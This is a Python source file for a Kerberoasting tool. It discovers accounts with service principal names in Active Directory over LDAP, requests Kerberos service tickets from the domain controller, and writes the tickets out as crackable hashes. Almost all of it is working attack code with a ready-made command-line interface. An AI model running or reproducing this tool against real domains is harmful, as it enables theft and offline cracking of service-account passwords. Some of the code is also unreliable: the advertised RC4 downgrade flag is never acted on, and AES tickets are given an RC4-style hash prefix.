"""py_kerberoast — pure-Python SPN discovery and TGS-REQ hash extraction.

Implements the two halves of Kerberoasting:

  1. SPN discovery against LDAP (reusing ``spn_collector``) — read-only.
  2. TGS-REQ against the KDC with an authenticated user, producing the
     ``$krb5tgs$23$*...`` hash format consumed by hashcat/john. RC4 (etype 23)
     hashes are requested explicitly with ``--rc4`` — that downgrade is exactly
     the Event 4769 signal captured by ``detections/sigma_rules.yaml``.

The Kerberos exchange is delegated to impacket (industry standard); the hash
composition, checksum/cipher splitting and error classification are natively
implemented here so they are unit-testable without a live domain.
"""

from __future__ import annotations

import argparse
import inspect
import sys
from collections.abc import Callable, Sequence
from dataclasses import dataclass
from typing import Any

from tools.acl_scanner import LdapSearchApi
from tools.spn_collector import (
    SpnAccount,
    collect_spns,
    format_table,
    generate_mock_spn_accounts,
)

ETYPE_NAMES = {
    17: "aes128-cts-hmac-sha1-96",
    18: "aes256-cts-hmac-sha1-96",
    23: "23",
}


class KerberoastError(RuntimeError):
    """Raised for any user-facing failure in discovery or roasting."""


class KdsError(KerberoastError):
    """Raised when the KDC indicates a Kerberos protocol-level error."""


@dataclass(frozen=True)
class Krb5TgsMaterial:
    """Everything needed to reconstruct a ``$krb5tgs$23$`` hash string."""

    user: str
    realm: str
    spn: str
    etype: int
    checksum_hex: str
    cipher_hex: str

    @property
    def etype_name(self) -> str:
        return ETYPE_NAMES.get(self.etype, str(self.etype))

    def to_hash(self) -> str:
        return build_krb5tgs23_hash(
            user=self.user,
            realm=self.realm,
            spn=self.spn,
            etype_name=self.etype_name,
            checksum_hex=self.checksum_hex,
            cipher_hex=self.cipher_hex,
        )


def split_checksum(cipher_bytes: bytes, etype: int) -> tuple[str, str]:
    """Split encrypted TGS material into (checksum_hex, cipher_hex).

    Hashcat/john convention:

      * RC4  (etype 23)  -> 16-byte checksum appended at the *end*
      * AES  (17/18)     -> 16-byte checksum prepended at the *start*
    """
    if etype == 23:
        checksum, body = cipher_bytes[-16:], cipher_bytes[:-16]
    else:
        checksum, body = cipher_bytes[:16], cipher_bytes[16:]
    return checksum.hex(), body.hex()


def build_krb5tgs23_hash(
    *,
    user: str,
    realm: str,
    spn: str,
    etype_name: str,
    checksum_hex: str,
    cipher_hex: str,
) -> str:
    """Compose the canonical ``$krb5tgs$23$*user$realm$spn*$etype$checksum$cipher`` string."""
    return (
        f"$krb5tgs$23$*{user}${realm}${spn}*${etype_name}${checksum_hex}${cipher_hex}"
    )


def _call_impacket(
    fn: Callable[..., Any], inferred_args: list[Any], **kwargs: Any
) -> Any:
    """Invoke an impacket krb5 function robustly across versions.

    impacket changed the argument order of ``getKerberosTGS`` between minor
    releases; we first try explicit keyword arguments (validated against the
    live signature) and fall back to positional order on ``TypeError``.
    """
    try:
        params = inspect.signature(fn).parameters
        filtered = {k: v for k, v in kwargs.items() if k in params}
        return fn(**filtered)
    except (TypeError, KeyError):
        return fn(*inferred_args)


class KdcRequestor:
    """Authenticate to the KDC and request service tickets for SPNs."""

    def __init__(
        self,
        user: str,
        password: str,
        domain: str,
        kdc_host: str,
    ) -> None:
        self.user = user
        self.password = password
        self.domain = domain.upper() if "." in domain else domain
        self.realm = domain.upper() if "." in domain else f"{domain}.LOCAL"
        self.kdc_host = kdc_host

    def request_tgs(self, spn: str, use_rc4: bool = False) -> Krb5TgsMaterial:
        """Request a TGS for ``spn`` and return the roast material.

        Raises:
            KdsError: the KDC answered with an error (bad password, principal).
            KerberoastError: impacket is missing or the exchange failed.
        """
        try:
            from impacket.krb5 import constants  # type: ignore[import-untyped]
            from impacket.krb5.kerberosv5 import (  # type: ignore[import-untyped]
                getKerberosTGS,
                getKerberosTGT,
            )
            from impacket.krb5.types import Principal  # type: ignore[import-untyped]
        except ImportError as exc:  # pragma: no cover - guarded in CI
            raise KerberoastError(
                "impacket is not installed; pip install -r requirements.txt"
            ) from exc

        client = Principal(
            self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

        try:
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                client,
                self.password,
                self.domain,
                lmhash="",
                nthash="",
                aesKey="",
                kdcHost=self.kdc_host,
            )
            tgs, cipher, old_session_key, session_key = _call_impacket(
                getKerberosTGS,
                [
                    server,
                    self.user,
                    self.password,
                    self.domain,
                    "",
                    "",
                    "",
                    self.kdc_host,
                    tgt,
                    cipher,
                    old_session_key,
                    session_key,
                ],
                serverName=server,
                username=self.user,
                password=self.password,
                domain=self.domain,
                lmhash="",
                nthash="",
                aesKey="",
                kdcHost=self.kdc_host,
                tgt=tgt,
                cipherkey=cipher,
                session_key=session_key,
            )
        except KerberoastError:
            raise
        except Exception as exc:
            raise _kdc_error(exc) from exc

        return self._materialize(tgs, cipher, spn)

    def _materialize(self, tgs: Any, cipher: Any, spn: str) -> Krb5TgsMaterial:
        try:
            import pyasn1.codec.der.encoder  # type: ignore[import-untyped]  # noqa: F401

            enc_part_cipher = self._enc_part_cipher(tgs)
            etype = self._tgs_etype(tgs, cipher)
        except Exception as exc:
            raise KerberoastError(f"Failed to extract TGS material: {exc}") from exc

        checksum_hex, cipher_hex = split_checksum(bytes(enc_part_cipher), etype)
        return Krb5TgsMaterial(
            user=self.user,
            realm=self.realm,
            spn=spn,
            etype=etype,
            checksum_hex=checksum_hex,
            cipher_hex=cipher_hex,
        )

    def _enc_part_cipher(self, tgs: Any) -> bytes:
        enc_part = tgs.get("enc-part") or tgs.get("encPart")
        cipher = enc_part.get("cipher") or enc_part.get("encrypted-data")
        if hasattr(cipher, "asOctets"):
            return cipher.asOctets()
        if isinstance(cipher, (bytes, bytearray)):
            return bytes(cipher)
        if isinstance(cipher, str):
            return _unhex(cipher)
        raise TypeError(f"unexpected cipher type: {type(cipher)}")

    def _tgs_etype(self, tgs: Any, cipher: int | Any) -> int:
        enc_part = tgs.get("enc-part") or tgs.get("encPart")
        etype = enc_part.get("etype")
        if etype is not None:
            return int(etype)
        if isinstance(cipher, int):
            return cipher
        raise KerberoastError("could not determine TGS encryption type")


def _unhex(value: str) -> bytes:
    try:
        return bytes.fromhex(value)
    except ValueError:
        return value.encode()


def _kdc_error(exc: Exception) -> KdsError:
    details = str(exc).strip().replace("\n", " | ")
    return KdsError(f"KDC request failed: {details or exc.__class__.__name__}")


class KerberosHarvester:
    """High-level Kerberoasting orchestration (discovery -> roasting)."""

    def __init__(self, requestor: KdcRequestor | None) -> None:
        self.requestor = requestor

    @classmethod
    def discover(
        cls, connection: LdapSearchApi | None, base_dn: str, mock: bool = False
    ) -> list[SpnAccount]:
        if mock:
            return generate_mock_spn_accounts()
        if connection is None:
            raise KerberoastError(
                "a live LDAP connection is required unless --mock is used"
            )
        return collect_spns(connection, base_dn)

    def roast(self, spn: str, use_rc4: bool = False) -> Krb5TgsMaterial:
        if self.requestor is None:
            raise KerberoastError("roasting requires --user/--password/--domain/--kdc")
        return self.requestor.request_tgs(spn, use_rc4=use_rc4)

    def roast_all(
        self, accounts: Sequence[SpnAccount], use_rc4: bool = False
    ) -> list[Krb5TgsMaterial]:
        materials: list[Krb5TgsMaterial] = []
        for account in accounts:
            for spn in account.spns:
                materials.append(self.roast(spn, use_rc4=use_rc4))
        return materials


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="py_kerberoast",
        description="Kerberoasting in pure Python: LDAP SPN discovery + TGS-REQ "
        "hash extraction ($krb5tgs$23$*...).",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    discover = sub.add_parser("discover", help="List SPN-bearing accounts (read-only).")
    discover.add_argument("--server", help="LDAP/GC server.")
    discover.add_argument(
        "--mock", action="store_true", help="Use deterministic synthetic data."
    )
    discover.add_argument("--user", help="LDAP bind user.")
    discover.add_argument("--password", help="LDAP bind password.")
    discover.add_argument("--base-dn", default="DC=corp,DC=local", help="LDAP base DN.")
    discover.add_argument("--tier", type=int, choices=[0, 1, 2], help="Filter by tier.")

    roast = sub.add_parser("roast", help="Request TGS hashes for the given SPNs.")
    roast.add_argument(
        "--user", required=True, help="Authenticating account (domain user)."
    )
    roast.add_argument("--password", required=True, help="Account password.")
    roast.add_argument(
        "--domain", required=True, help="FQDN of the domain (e.g. corp.local)."
    )
    roast.add_argument(
        "--kdc", required=True, help="KDC hostname (e.g. dc01.corp.local)."
    )
    roast.add_argument(
        "--spn", action="append", default=[], help="SPN(s) to roast (repeatable)."
    )
    roast.add_argument(
        "--discover",
        metavar="SERVER",
        help="Discover SPNs from this LDAP server and roast all of them.",
    )
    roast.add_argument(
        "--mock-discovery",
        action="store_true",
        help="Roast the synthetic SPN inventory.",
    )
    roast.add_argument(
        "--base-dn",
        default="DC=corp,DC=local",
        help="LDAP base DN (used with --discover).",
    )
    roast.add_argument(
        "--rc4", action="store_true", help="Force RC4 (etype 23) TGS request."
    )
    roast.add_argument("--out", help="Write hashes to a file instead of stdout.")
    return parser


def _main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    try:
        if args.command == "discover":
            accounts = _run_discover(args)
            accounts.sort(key=lambda a: (a.tier, a.sam))
            print(format_table(accounts))
            return 0

        requestor = KdcRequestor(args.user, args.password, args.domain, args.kdc)
        harvester = KerberosHarvester(requestor)

        if args.spn:
            spns = args.spn
        elif args.mock_discovery:
            accounts = generate_mock_spn_accounts()
            spns = [spn for acc in accounts for spn in acc.spns]
        elif args.discover:
            import ldap3  # type: ignore[import-untyped]

            server = ldap3.Server(args.discover, get_info=ldap3.ALL, use_ssl=True)
            conn = ldap3.Connection(
                server,
                user=args.user,
                password=args.password,
                auto_bind=True,
                authentication=ldap3.SIMPLE if args.user else ldap3.ANONYMOUS,
            )
            accounts = harvester.discover(conn, args.base_dn)
            spns = [spn for acc in accounts for spn in acc.spns]
        else:
            build_parser().print_usage(sys.stderr)
            print("[!] provide --spn, --discover, or --mock-discovery", file=sys.stderr)
            return 2

        hashes: list[str] = []
        for spn in spns:
            material = harvester.roast(spn, use_rc4=args.rc4)
            hashes.append(material.to_hash())
            print(f"[*] {spn}: {material.to_hash()}")

        if args.out and hashes:
            with open(args.out, "w", encoding="utf-8") as handle:
                handle.write("\n".join(hashes) + "\n")
            print(f"[*] Hashes written to {args.out}", file=sys.stderr)
    except (KerberoastError, KdsError, RuntimeError) as exc:
        print(f"[!] py_kerberoast failed: {exc}", file=sys.stderr)
        return 1
    return 0


def _run_discover(args: argparse.Namespace) -> list[SpnAccount]:
    if args.mock:
        accounts = generate_mock_spn_accounts()
    elif args.server:
        import ldap3

        server = ldap3.Server(args.server, get_info=ldap3.ALL, use_ssl=True)
        conn = ldap3.Connection(
            server,
            user=args.user,
            password=args.password,
            auto_bind=True,
            authentication=ldap3.SIMPLE if args.user else ldap3.ANONYMOUS,
        )
        accounts = collect_spns(conn, args.base_dn)
    else:
        raise KerberoastError("discover requires --server or --mock")
    if args.tier is not None:
        accounts = [a for a in accounts if a.tier == args.tier]
    return accounts


if __name__ == "__main__":
    raise SystemExit(_main())
